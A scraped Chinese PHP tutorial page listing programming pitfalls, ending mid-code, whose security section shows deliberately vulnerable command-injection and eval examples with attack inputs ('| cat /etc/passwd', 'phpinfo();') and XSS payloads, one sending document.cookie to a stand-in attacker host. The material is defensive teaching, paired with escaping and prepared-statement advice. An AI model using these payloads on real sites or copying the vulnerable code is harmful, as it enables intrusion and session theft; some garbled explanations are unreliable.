<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <title>PHP编程注意的解决办法_PHP教程_IDC笔记</title>
    <meta name="keywords" content="PHP,PHP笔记,PHP教程" />
    <meta name="description" content="这篇文章主要为大家详细介绍了PHP编程注意的简单示例，具有一定的参考价值，可以用来参考一下。<br />
<br />
感兴趣的小伙伴，下面一起跟随php教程的小玲来看看吧！<br />
1、php隐性的三元操作符(?:" />
    <meta content="Responsive admin theme build on top of Bootstrap 4" name="description" />
    <meta content="idcnote.com" name="author" />
    <link rel="shortcut icon" href="/skin1/images/favicon.ico">
    <!--Morris Chart CSS -->
    <link rel="stylesheet" href="/skin1/css/morris.css">
    <link href="/skin1/css/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/metismenu.min.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/icons.css" rel="stylesheet" type="text/css">
    <link href="/skin1/css/style.css" rel="stylesheet" type="text/css">
<link href="/SyntaxHighlighter/shCoreDefault.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">
 SyntaxHighlighter.all();
</script>
<script>
var paras = document.getElementsByTagName("pre");
for ( var i=0;i<paras.length;i++ ) {
    paras[i].setAttribute("class","brush:php;toolbar:false");     
}
</script>
</head>
<body>
<!-- Begin page -->
		<div id="wrapper">
			<!-- Top Bar Start -->
			<div class="topbar">
				<!-- LOGO -->
				<div class="topbar-left">
					<a href="/" class="logo">
						<span class="logo-light">
                            <i class="mdi mdi-camera-control"></i>IDC笔记
                        </span>
						<span class="logo-sm">
                            <i class="mdi mdi-camera-control"></i>
                        </span>
					</a>
				</div>
				<nav class="navbar-custom">
					<ul class="navbar-right list-inline float-right mb-0">
						<!--<li class="dropdown notification-list list-inline-item d-none d-md-inline-block">
							<a class="nav-link waves-effect" href="#" id="btn-fullscreen">
								<i class="mdi mdi-arrow-expand-all noti-icon"></i>
							</a>
						</li>
						<li class="dropdown notification-list list-inline-item">
							<div class="dropdown notification-list nav-pro-img">
								<a class="dropdown-toggle nav-link arrow-none nav-user" data-toggle="dropdown" href="#" role="button" aria-haspopup="false" aria-expanded="false">
									<img src="/skin1/picture/user-4.jpg" alt="user" class="rounded-circle">
								</a>
								<div class="dropdown-menu dropdown-menu-right profile-dropdown ">
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-account-circle"></i> Profile</a>
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-wallet"></i> Wallet</a>
									<a class="dropdown-item d-block" href="#">
										<span class="badge badge-success float-right">11</span>
										<i class="mdi mdi-settings"></i> Settings</a>
									<a class="dropdown-item" href="#">
										<i class="mdi mdi-lock-open-outline"></i> Lock screen</a>
									<div class="dropdown-divider"></div>
									<a class="dropdown-item text-danger" href="#">
										<i class="mdi mdi-power text-danger"></i> Logout</a>
								</div>
							</div>
						</li>
						-->
					</ul>
					<ul class="list-inline menu-left mb-0">
						<li class="float-left">
							<button class="button-menu-mobile open-left waves-effect">
                            <i class="mdi mdi-menu"></i>
                        </button>
						</li>
						<li class="d-none d-md-inline-block">
							<form role="search" class="app-search">
								<div class="form-group mb-0">
									<input type="text" class="form-control" placeholder="Search..">
									<button type="submit"><i class="fa fa-search"></i></button>
								</div>
							</form>
						</li>
					</ul>
				</nav>
			</div>
<!-- ========== Left Sidebar Start ========== -->
<div class="left side-menu">
    <div class="slimscroll-menu" id="remove-scroll">
    <!--- Sidemenu -->
    <div id="sidebar-menu">
    <!-- Left Menu Start -->
    <ul class="metismenu" id="side-menu">
			<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP简介			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/jianjie/1.html">PHP简介</a></li><li><a href="/php/jianjie/2.html">PHP用途</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP基本语法			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/yufa/3.html">分离HTML</a></li><li><a href="/php/yufa/4.html">指令分隔符</a></li><li><a href="/php/yufa/5.html">PHP注释</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP类型			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/phpleixing/6.html">PHP类型简介</a></li><li><a href="/php/phpleixing/7.html">PHP类型之布尔类型</a></li><li><a href="/php/phpleixing/8.html">PHP类型之整型</a></li><li><a href="/php/phpleixing/9.html">PHP类型之浮点型</a></li><li><a href="/php/phpleixing/10.html">PHP类型之字符串</a></li><li><a href="/php/phpleixing/11.html">PHP类型之数组</a></li><li><a href="/php/phpleixing/12.html">PHP类型之对象</a></li><li><a href="/php/phpleixing/13.html">PHP类型之资源类型</a></li><li><a href="/php/phpleixing/14.html">PHP类型之NULL</a></li><li><a href="/php/phpleixing/15.html">PHP类型之伪类型</a></li><li><a href="/php/phpleixing/16.html">PHP类型之类型判别</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP变量			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/phpbianliang/17.html">PHP变量之基础</a></li><li><a href="/php/phpbianliang/18.html">PHP变量之预定义变量</a></li><li><a href="/php/phpbianliang/19.html">PHP变量之变量范围</a></li><li><a href="/php/phpbianliang/20.html">PHP变量之可变变量</a></li><li><a href="/php/phpbianliang/21.html">PHP变量之外部变量</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP运算符			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/yunsuanfu/22.html">PHP运算符优先级</a></li><li><a href="/php/yunsuanfu/23.html">算术运算符</a></li><li><a href="/php/yunsuanfu/24.html">赋值运算符</a></li><li><a href="/php/yunsuanfu/25.html">位运算符</a></li><li><a href="/php/yunsuanfu/26.html">比较运算符</a></li><li><a href="/php/yunsuanfu/27.html">错误控制运算符</a></li><li><a href="/php/yunsuanfu/28.html">执行运算符</a></li><li><a href="/php/yunsuanfu/29.html">递增/递减运算符</a></li><li><a href="/php/yunsuanfu/30.html">逻辑运算符</a></li><li><a href="/php/yunsuanfu/31.html">字符串运算符</a></li><li><a href="/php/yunsuanfu/32.html">数组运算符</a></li><li><a href="/php/yunsuanfu/33.html">类型运算符</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP控制结构			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/jiegou/34.html">PHP控制结构之if</a></li><li><a href="/php/jiegou/35.html">PHP控制结构之else</a></li><li><a href="/php/jiegou/36.html">PHP控制结构之elseif/else if</a></li><li><a href="/php/jiegou/37.html">PHP控制结构之替代语法</a></li><li><a href="/php/jiegou/38.html">PHP控制结构之while</a></li><li><a href="/php/jiegou/39.html">PHP控制结构之do-while</a></li><li><a href="/php/jiegou/40.html">PHP控制结构之for</a></li><li><a href="/php/jiegou/41.html">PHP控制结构之foreach</a></li><li><a href="/php/jiegou/42.html">PHP控制结构之break</a></li><li><a href="/php/jiegou/43.html">PHP控制结构之continue</a></li><li><a href="/php/jiegou/44.html">PHP控制结构之switch</a></li><li><a href="/php/jiegou/45.html">PHP控制结构之declare</a></li><li><a href="/php/jiegou/46.html">PHP控制结构之return</a></li><li><a href="/php/jiegou/47.html">PHP控制结构之require</a></li><li><a href="/php/jiegou/48.html">PHP控制结构之include</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP函数			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/hanshu/52.html">用户自定义函数</a></li><li><a href="/php/hanshu/53.html">函数的参数</a></li><li><a href="/php/hanshu/54.html">返回值</a></li><li><a href="/php/hanshu/55.html">可变函数</a></li><li><a href="/php/hanshu/56.html">内部（内置）函数</a></li><li><a href="/php/hanshu/57.html">匿名函数</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP类与对象			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/phpduixiang/58.html">类与对象前言</a></li><li><a href="/php/phpduixiang/59.html">基本概念</a></li><li><a href="/php/phpduixiang/60.html">属性</a></li><li><a href="/php/phpduixiang/61.html">类常量</a></li><li><a href="/php/phpduixiang/62.html">自动加载对象</a></li><li><a href="/php/phpduixiang/63.html">构造函数和析构函数</a></li><li><a href="/php/phpduixiang/64.html">访问控制</a></li><li><a href="/php/phpduixiang/65.html">对象继承</a></li><li><a href="/php/phpduixiang/66.html">Static关键字</a></li><li><a href="/php/phpduixiang/67.html">抽象类</a></li><li><a href="/php/phpduixiang/68.html">接口</a></li><li><a href="/php/phpduixiang/69.html">Traits</a></li><li><a href="/php/phpduixiang/70.html">重载</a></li><li><a href="/php/phpduixiang/71.html">对象迭代</a></li><li><a href="/php/phpduixiang/72.html">设计模式</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP异常处理			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/yichang/81.html">异常处理</a></li><li><a href="/php/yichang/82.html">扩展PHP内置的异常处理类</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> PHP函数库按分类			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/phpku/83.html">数组</a></li><li><a href="/php/phpku/84.html">Classes/Objects</a></li><li><a href="/php/phpku/85.html">Date/Time</a></li><li><a href="/php/phpku/86.html">Directories</a></li><li><a href="/php/phpku/87.html">错误处理</a></li><li><a href="/php/phpku/88.html">Program execution</a></li><li><a href="/php/phpku/89.html">Filesystem</a></li><li><a href="/php/phpku/90.html">Filter</a></li><li><a href="/php/phpku/91.html">Function Handling</a></li><li><a href="/php/phpku/92.html">PHP 选项/信息</a></li><li><a href="/php/phpku/93.html">Mail</a></li><li><a href="/php/phpku/94.html">Math</a></li><li><a href="/php/phpku/95.html">Misc.</a></li><li><a href="/php/phpku/96.html">Network</a></li><li><a href="/php/phpku/97.html">输出控制</a></li>		</ul>
	</li>
		<li>
		<a href="javascript:void(0);" class="waves-effect">
			<i class="icon-share"></i>
			<span> php基础			<span class="float-right menu-arrow">
			<i class="mdi mdi-chevron-right"></i>
			</span> 
			</span>
		</a>
		<ul class="submenu">
			 <li><a href="/php/phpbiji/122.html"></a></li><li><a href="/php/phpbiji/123.html"></a></li><li><a href="/php/phpbiji/124.html"></a></li><li><a href="/php/phpbiji/125.html"></a></li><li><a href="/php/phpbiji/126.html"></a></li><li><a href="/php/phpbiji/127.html"></a></li><li><a href="/php/phpbiji/128.html"></a></li><li><a href="/php/phpbiji/129.html"></a></li><li><a href="/php/phpbiji/130.html"></a></li><li><a href="/php/phpbiji/108377.html"></a></li><li><a href="/php/phpbiji/108376.html"></a></li><li><a href="/php/phpbiji/108380.html"></a></li><li><a href="/php/phpbiji/108379.html"></a></li><li><a href="/php/phpbiji/108378.html"></a></li><li><a href="/php/phpbiji/108381.html"></a></li>		</ul>
	</li>
		<li>
	    <a href="/php/biji/" class="waves-effect">
		    <i class="icon-share"></i>
		    <span>PHP笔记
		       	<span class="float-right menu-arrow">
		       	<i class="mdi mdi-chevron-right"></i>
		       	</span>
		    </span>
	    </a>
	</li>
	</ul>
</div>
<!-- Sidebar -->
<div class="clearfix"></div>
</div>
<!-- Sidebar -left -->
</div>
<!-- Left Sidebar End -->
<!-- Start right Content here -->
<div class="content-page">
	<div class="content">
		<div class="container-fluid">
			<div class="page-title-box">
				<div class="row align-items-center">
					<div class="col-sm-6">
						<h1 class="page-title">PHP编程注意的解决办法</h1>
					</div>
				</div>
				<!-- end row -->
			</div>
			<!-- end page-title -->
			<!-- START ROW -->
			<div class="panel panel-forbid">
				<div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>内容摘要</div>
			    <div class="panel-content">
			    <span>这篇文章主要为大家详细介绍了PHP编程注意的简单示例，具有一定的参考价值，可以用来参考一下。<br />
<br />
感兴趣的小伙伴，下面一起跟随php教程的小玲来看看吧！<br />
1、php隐性的三元操作符(?:</span>                                     
		    	</div>
			    <div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>文章正文</div>
			    <div class="panel-content">
			    <span><p>这篇文章主要为大家详细介绍了PHP编程注意的简单示例，具有一定的参考价值，可以用来参考一下。</p>

<p>感兴趣的小伙伴，下面一起跟随php教程的小玲来看看吧！</p>
<p><strong>1、php隐性的三元操作符(?:)优先级问题：</strong></p>
<p>例1：</p>
<p>代码如下:</p>
<pre>

<code>    $person = $who or $person = "laruence";  

    //实际上是等同于:  

    $person = empty($who)? "laruence" : $who;  
</code></pre>例2
<p>代码如下:</p>
<pre>

<code>    $arr = array（1=&gt;1,3=&gt;3）；  
    $i = 2;  
    $a = 'test‘ . isset($arr[$i]) ? $arr[$i] : $i;  
</code></pre>$a 是什么? 这个问题, 咋一看觉得简单,
<p></p>
<p>$a = &lsquo;test2&#39;;</p>
<p>其实仔细推敲后运行的，结果是notice：Undefined index 2..</p>
<p>由于优先级的问题, 连接符的优先级比三元操作符高。</p>
<p>首先是判断 &#39; test&#39;. isset($arr[$i]) 这个字符串永远是true，因此：</p>
<p>$a = $arr[$i]；以致php提示提醒。</p>
<p><strong>2. PHP函数名和类名不区分大小写的，而变量名是区分大小写的。</strong></p>
<p>所以自己写的php模块，往往是大写的问题，编译不通过。</p>
<p><strong>3.系列化传递问题</strong></p>
<p>把复杂的数据类型压缩到一个字符串中serialize() 把变量和它们的值编码成文本形式unserialize() 恢复原先变量</p>
<p>代码如下:</p>
<pre>

<code>    $stooges = array('Moe','Larry','Curly');  
    $new = serialize($stooges);  
    print_r($new);echo "&lt;br /&gt;";  
    print_r(unserialize($new));  
    &lt;span style="font-family:Arial;BACKGROUND-COLOR: #ffffff"&gt;&lt;/span&gt;  
</code></pre>
<p></p>
<p>结果：a:3:{i:0;s:3:&quot;Moe&quot;;i:1;s:5:&quot;Larry&quot;;i:2;s:5:&quot;Curly&quot;;}Array ( [0] =&gt; Moe [1] =&gt; Larry [2] =&gt; Curly )当把这些序列化的数据放在URL中在页面之间会传递时，需要对这些数据调用urlencode()，以确保在其中的URL元字符进行处理：</p>
<p>代码如下:</p>
<pre>

<code>$shopping = array('Poppy seed bagel' =&gt; 2,'Plain Bagel' =&gt;1,'Lox' =&gt;4);  
echo '&lt;a href="next.php?cart='.urlencode(serialize($shopping)).'"&gt;next&lt;/a&gt;'; 
</code></pre>margic_quotes_gpc和magic_quotes_runtime配置项的设置会影响传递到unserialize()中的数据。如果magic_quotes_gpc项是启用的，那么在URL、POST变量以及cookies中传递的数据在反序列化之前必须用stripslashes()进行处理：
<p>代码如下:</p>
<pre>

<code>    $new_cart = unserialize(stripslashes($cart)); //如果magic_quotes_gpc开启  
    $new_cart = unserialize($cart);  
</code></pre>如果magic_quotes_runtime是启用的，那么在向文件中写入序列化的数据之前必须用addslashes()进行处理，而在读取它们之前则必须用stripslashes()进行处理：
<p>代码如下:</p>
<pre>

<code>$fp = fopen('/tmp/cart','w');  
fputs($fp,addslashes(serialize($a)));  
fclose($fp);  
//如果magic_quotes_runtime开启  
$new_cat = unserialize(stripslashes(file_get_contents('/tmp/cart')));  
//如果magic_quotes_runtime关闭  
$new_cat = unserialize(file_get_contents('/tmp/cart'));
</code></pre>在启用了magic_quotes_runtime的情况下，从数据库中读取序列化的数据也必须经过stripslashes()的处理，保存到数据库中的序列化数据必须要经过addslashes()的处理，以便能够适当地存储。
<p>代码如下:</p>
<pre>

<code>    mysql_query("insert into cart(id,data) values(1,'".addslashes(serialize($cart))."')");  
    $rs = mysql_query('select data from cart where id=1');  
    $ob = mysql_fetch_object($rs);  
    //如果magic_quotes_runtime开启  
    $new_cart = unserialize(stripslashes($ob-&gt;data));  
    //如果magic_quotes_runtime关闭  
    $new_cart = unserialize($ob-&gt;data);  
</code></pre>当对一个对象进行反序列化操作时，PHP会自动地调用其__wakeUp()方法。这样就使得对象能够重新建立起序列化时未能保留的各种状态。例如：数据库连接等。
<p></p>
<p><strong>4. 引用注意事项</strong>PHP中引用意味着用不同的名字访问同一个变量内容，引用不是C的指针（Ｃ语言中的指针里面存储的是变量的内容，在内存中存放的地址），是变量的另外一个别名或者映射。注意在 PHP 中，变量名和变量内容是不一样的，因此同样的内容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身――变量名是目录条目，而变量内容则是文件本身。引用可以被看作是 Unix 文件系统中的紧密连接或者wins的快捷方式。<strong>1）unset 一个引用，只是断开了变量名和变量内容之间的绑定。这并不意味着变量内容被销毁了</strong>例如：不会 unset $b，只是 $a。</p>
<p>代码如下:</p>
<pre>

<code>    &lt;?php
/*   php教程 www.512Pic.com   */
    

         $a   =   1 ;    
         $b   =&amp;   $a ;    
         unset  ( $a );    
         echo $b; //输出：1:  
</code></pre>使用unset($a)与$a=null的结果是不一样的。如果该块内存只有$a一个映射，那么unset($a)与$a=null等价，该内存的引用计数变为0，被自动回收；如果该块内存有$a和$b两个映射，那么unset($a)将导致$a=null且$b不变的情况，而$a=null会导致$a=$b=null的情况。原因：某变量赋值为null，将导致该变量对应的内存块的引用计数直接置为0，被自动回收。
<p></p>
<p><strong>2）PHP引用是采用引用计数、写时拷贝</strong></p>
<p>很多人误解Php中的引用跟C当中的指针一样，事实上并非如此，而且很大差别。C语言中的指针除了在数组传递过程中不用显式申明外，其他都需要使用*进行定义，而php中对于地址的指向（类似指针）功能不是由用户自己来实现的，是由Zend核心实现的，php中引用采用的是&ldquo;引用计数、写时拷贝&rdquo;的原理，(写时复制（Copy-on-Write，也缩写为COW），顾名思义，就是在写入时才真正复制一份内存进行修改。)</p>
<p>就是除非发生写操作，指向同一个地址的变量或者对象是不会被拷贝的，比如下面的代码：$a = array(&#39;a&#39;,&#39;c&#39;...&#39;n&#39;);$b = $a;如果程序仅执行到这里，$b和$b是相同的，但是并没有像C那样，$a和$b占用不同的内存空间，而是指向了同一块内存，这就是php和c的差别，并不需要写成$b=&amp;$a才表示$b指向$a的内存，zend就已经帮你实现了引用，并且zend会非常智能的帮你去判断什么时候该这样处理，什么时候不该这样处理。</p>
<p>如果在后面继续写如下代码，增加一个函数，通过引用的方式传递参数，并打印输出数组大小。</p>
<p>代码如下:</p>
<pre>

<code>    function printArray(&amp;$arr) //引用传递  
     {  
        print(count($arr));  
    }  
     printArray($a);  
</code></pre>上面的代码中，我们通过引用把$a数组传入printArray()函数，zend引擎会认为printArray()可能会导致对$a的改变，此时就会自动为$b生产一个$a的数据拷贝，重新申请一块内存进行存储。这就是前面提到的&ldquo;引用计数、写时拷贝&rdquo;概念。
<p></p>
<p>直观的理解：$a将使用自己原始的内存空间，而$b，则会使用新开辟的内存空间，而这个空间将使用$a的原始（$a或者$b改变之前）内容空间的内容的拷贝，然后做对应的改变。</p>
<p>如果我们把上面的代码改成下面这样：</p>
<p>代码如下:</p>
<pre>

<code>    function printArray($arr)  //值传递  
     {  
         print(count($arr));  
     }  
     printArray($a);  
</code></pre>上面的代码直接传递$a值到printArray()中，此时并不存在引用传递，所以没有出现写时拷贝。
<p></p>
<p><strong>5. 编码的问题</strong></p>
<p>程序代码使用utf-8码，而strlen函数是计算字符串的字节数而不是字符数？$str = &ldquo;您好hello&rdquo;;</p>
<p>echo strlen($str);</p>
<p>结果：ANSI=9 而utf-8=11，utf-8中文字符编码是3个字节。要获取字符数，使用mb_strlen().</p>
<p><strong>6. PHP获取参数的三种方法</strong></p>
<p><strong>方法一 使用$argc $argv</strong></p>
<p>代码如下:</p>
<pre>

<code>&lt;?php
/*   php教程 www.512Pic.com   */
  
    if ($argc &gt; 1){  
        print_r($argv);  
    } 
</code></pre>在命令行下运行 /usr/local/php/bin/php ./getopt.php -f 123 -g 456
<p></p>
<p>运行结果： # /usr/local/php/bin/php ./getopt.php -f 123 -g 456 Array ( [0] =&gt; ./getopt.php [1] =&gt; -f [2] =&gt; 123 [3] =&gt; -g [4] =&gt; 456 )</p>
<p><strong>方法二 使用getopt函数（）</strong></p>
<p>代码如下:</p>
<pre>

<code>    $options = "f:g:";  
    $opts = getopt( $options );  
    print_r($opts);  
</code></pre>在命令行下运行 /usr/local/php/bin/php ./getopt.php -f 123 -g 456运行结果： Array ( [f] =&gt; 123 [g] =&gt; 456 )
<p></p>
<p><strong>方法三 提示用户输入，然后获取输入的参数。有点像C语言</strong></p>
<p>代码如下:</p>
<pre>

<code>fwrite(STDOUT, "Enter your name: ");  
$name = trim(fgets(STDIN));  
fwrite(STDOUT, "Hello, $name!");
</code></pre>在命令行下运行 /usr/local/php/bin/php ./getopt.php运行结果 Enter your name: francis Hello, francis!
<p></p>
<p><strong>7. php的字符串即可以当做数组,和c指针字符串一样</strong></p>
<p>代码如下:</p>
<pre>

<code>    &lt;?php
/*   php教程 www.512Pic.com   */
  
    $s = '12345';  
    $s[$s[0]] = 0;  
    echo $s;  
    ?&gt;  
</code></pre><strong>结果是10345</strong>
<p></p>
<p><strong>8. PHP的高效率写法：9. PHP的安全漏洞问题：</strong></p>
<p>针对PHP的网站主要存在下面几种攻击方式：</p>
<p><strong>1、命令注入(Command Injection)</strong></p>
<p> PHP中可以使用下列5个函数来执行外部的应用程序或函数 system、exec、passthru、shell_exec、&ldquo;(与shell_exec功能相同) 如：</p>
<p>代码如下:</p>
<pre>

<code>    &lt;?php
/*   php教程 www.512Pic.com   */
  
    $dir = $_GET["dir"];   
    if (isset($dir)) {       
        echo "";       
        system("ls -al ".$dir);       
        echo "";   
    }   
    ?&gt;   
</code></pre>我们提交http://www.test.com/ex1.php?dir=| cat /etc/passwd，命令变成了 system(&quot;ls -al | cat /etc/passwd&quot;); 我们服务器用户信息被窃看了吧。
<p></p>
<p><strong>2、eval注入(Eval Injection)</strong></p>
<p>eval函数将输入的字符串参数当作PHP程序代码来执行，eval注入一般发生在攻击者能控制输入的字符串的时候。</p>
<p>代码如下:</p>
<pre>

<code>$var = "var";   
if (isset($_GET["arg"]))   
{   
    $arg = $_GET["arg"];   
    eval("\$var = $arg;");   
    echo "\$var =".$var;   
}   
?&gt; 
</code></pre>当我们提交http://www.sectop.com/ex2.php?arg=phpinfo();漏洞就产生了；
<p></p>
<p>防范命令注入和eval注入的方法</p>
<p> 1）、尽量不要执行外部命令。</p>
<p> 2）、使用自定义函数或函数库来替代外部命令的功能，甚至有些服务器直接禁止使用这些函数。</p>
<p> 3）、使用escapeshellarg函数来处理命令参数，esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号&ldquo;&#39;&rdquo;，替换成&ldquo;\&#39;&rdquo;，双引号&ldquo;&quot;&rdquo;，替换成&ldquo;\&quot;&rdquo;，分号&ldquo;;&rdquo;替换成&ldquo;\;&rdquo;</p>
<p><strong>3、客户端脚本攻击(Script Insertion)</strong></p>
<p>客户端脚本植入的攻击步骤</p>
<p>1）、攻击者注册普通用户后登陆网站</p>
<p>2）、打开留言页面，插入攻击的js代码</p>
<p>3）、其他用户登录网站（包括管理员），浏览此留言的内容</p>
<p>4）、隐藏在留言内容中的js代码被执行，攻击成功</p>
<p>表单输入一些浏览器可以执行的脚本：</p>
<p>插入 &lt;script&gt;while(1){windows.open();}&lt;/script&gt; 无限弹框</p>
<p>插入&lt;script&gt;location.href=&quot;http://www.sectop.com&quot;;&lt;/script&gt; 跳转钓鱼页面防止恶意HTML标签的最好办法是使用htmlspecailchars或者htmlentities使某些字符串转为html实体。</p>
<p><strong>4、跨网站脚本攻击(Cross Site Scripting, XSS)</strong></p>
<p>恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p>
<p>跨站脚本主要被攻击者利用来读取网站用户的cookies或者其他个人数据，一旦攻击者得到这些数据，那么他就可以伪装成此用户来登录网站，获得此用户的权限。</p>
<p>跨站脚本攻击的一般步骤:</p>
<p>1）、攻击者以某种方式发送xss的http链接给目标用户，例如评论表单：</p>
<p> 插入&lt;script&gt;document.location= &ldquo;go.somewhere.bad？cookie=+&ldquo;this.cookie&lt;/script&gt;</p>
<p> 或者是链接：</p>
<p> http://w w w.my.site/index.php?user=&lt; script &gt;document.location=&quot;http://w w w.atacker.site/get.php?cookie=&quot;+document.cookie;&lt; / script &gt;</p>
<p>2）、目标用户登录此网站，在登陆期间打开了攻击者发送的xss链接</p>
<p>3）、网站执行了此xss攻击脚本</p>
<p>4）、目标用户页面跳转到攻击者的网站，攻击者取得了目标用户的信息</p>
<p>5）、攻击者使用目标用户的信息登录网站，完成攻击</p>
<p> 防止恶意HTML标签的最好办法还是使用htmlspecailchars或者htmlentities使某些字符串转为html实体。</p>
<p><strong>5、SQL注入攻击(SQL injection)</strong></p>
<p> <strong>SQL注入最有效的防御方式是使用准备语句：</strong></p>
<p> 准备语句（也叫预备语句 prepared statements），是一种查询，先将他们发送到服务器进行预编译和准备，并且在以后的执行这个查询时告诉它存储参数的位置。</p>
<p><strong>其优点：</strong></p>
<p> 1）对参数值进行转义。因此不必调用像mysqli::real_escape_string或者将参数放在引号中。</p>
<p> 2）当在一个脚本中多次执行时，预备语句的性能通常好于每次都通过网络发送查询，当再次执行一个查询时，只将参数发送到数据库，这占用的空间比较少。</p>
<p>1）用PDO(PHP Data Objects )：</p>
<p>代码如下:</p>
<pre>

<code>PHP PDO::prepare() and execute()   

$preparedStatement = $db-&gt;prepare('INSERT INTO table (column) VALUES (:column)');    

$preparedStatement-&gt;execute(array(':column' =&gt; $unsafeValue)); 
</code></pre>2) 使用mysqli:
<p>代码如下:</p>
<pre>

<code>    $stmt = $dbConnection-&gt;prepare('SELECT * FROM employees WHERE name = ?');   

    $stmt-&gt;bind_param('s', $name);    

    $stmt-&gt;execute();    

    $result = $stmt-&gt;get_result();    

    while ($row = $result-&gt;fetch_assoc()) {    

        // do something with $row     

    }    
</code></pre>6、跨网站请求伪造攻击(Cross Site Request Forgeries, CSRF)
<p></p>
<p>7、Session 会话劫持(Session Hijacking)</p>
<p>8、Session 固定攻击(Session Fixation)</p>
<p>9、HTTP响应拆分攻击(HTTP Response Splitting)</p>
<p>10、文件上传漏洞(File Upload Attack)</p>
<p>11、目录穿越漏洞(Directory Traversal)</p>
<p>12、远程文件包含攻击(Remote Inclusion)</p>
<p>13、动态函数注入攻击(Dynamic Variable Evaluation)</p>
<p>14、URL攻击(URL attack)</p>
<p>15、表单提交欺骗攻击(Spoofed Form Submissions)</p>
<p>16、HTTP请求欺骗攻击(Spoofed HTTP Requests)</p>
<p>几个重要的php.ini选项：register_globals、、magic_quotes、safe_mode。 这个几个选项在PHP5.4都将被弃用。</p>
<p>register_globals：</p>
<p> php&gt;=4.2.0，php.ini的register_globals选项的默认值预设为Off，当register_globals</p>
<p>的设定为On时，程序可以接收来自服务器的各种环境变量，包括表单提交的变量，而且由于PHP不必事先初始化变量的值，从而导致很大的安全隐患。</p>
<p> 要确保禁用 register_globals。如果启用了 register_globals，就可能做一些粗心的事情，比如使用 $variable 替换同名的 GET 或 POST 字符串。通过禁用这个设置，PHP 强迫您在正确的名称空间中引用正确的变量。要使用来自表单 POST 的变量，应该引用 $_POST[&#39;variable&#39;]。这样就不会将这个特定变量误会成 cookie、会话或 GET 变量。</p>
<p><strong>safe_mode：</strong></p>
<p>安全模式，PHP用来限制文档的存取、限制环境变量的存取，控制外部程序的执行。启用安全模式必须设置php.ini中的safe_mode=On</p>
<p><strong>magic_quotes</strong></p>
<p>用来让php程序的输入信息自动转义，所有的单引号(&ldquo;&#39;&rdquo;)，双引号(&ldquo;&quot;&rdquo;)，反斜杠(&ldquo;\&rdquo;)和空字符(NULL)，都自动被加上反斜杠进行转义magic_quotes_gpc=On用来设置magicquotes为On，它会影响HTTP请求的数据(GET、POST、Cookies)程序员也可以使用addslashes来转义提交的HTTP 请求数据，或者用stripslashes 来删除转义。</p>
<p><strong>10. curl多请求并发使用</strong></p>
<p>curl大家一定使用过，但并发使用的情况估计不多。但在某些情况下确实比较有用，比如在同一请求里面调用多个他方接口，传统方法我们需要串行请求接口:</p>
<p>file_get_contents(&#39;http://a.php&#39;);//1秒</p>
<p>file_get_contents(&#39;http://b.php&#39;);//2秒</p>
<p>file_get_contents(&#39;http://c.php&#39;);//2秒</p>
<p>那在这里耗时为5秒，但运营curl的muti方法，我们只需2秒就可请求完毕. 在php的手册里面有一段代码：</p>
<p>代码如下:</p>
<pre>

<code>    $mrc = curl_multi_init();  
    //发出请求  
    .......  
    $active = null;  
            do {  
